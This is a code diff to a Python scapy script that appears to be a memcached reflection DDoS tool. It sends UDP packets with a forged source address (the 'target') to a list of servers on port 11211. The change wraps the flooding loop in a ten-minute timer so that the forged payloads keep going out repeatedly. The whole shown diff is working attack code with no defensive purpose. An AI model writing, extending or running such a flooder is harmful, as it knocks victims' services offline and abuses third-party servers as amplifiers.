@@ -9,6 +9,7 @@ import logging
 from pathlib import Path
 from scapy.all import *
 from contextlib import contextmanager, redirect_stdout
+import datetime
 
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
@@ -121,10 +122,12 @@ while True:
             break
 
         print('[*] Sending packets...')
-        for ip in ip_array:
-            print(f'[+] Sending forged payloads to: {ip}')
-            with suppress_stdout():
-                send(IP(src=target, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=data), count=power)
+        end_time = datetime.datetime.now() + datetime.timedelta(minutes=10)  # Run for 10 minutes
+        while datetime.datetime.now() < end_time:
+            for ip in ip_array:
+                print(f'[+] Sending forged payloads to: {ip}')
+                with suppress_stdout():
+                    send(IP(src=target, dst=ip) / UDP(sport=targetport, dport=11211) / Raw(load=data), count=power)
 
         print('[✓] Task complete! Exiting platform.')
         break
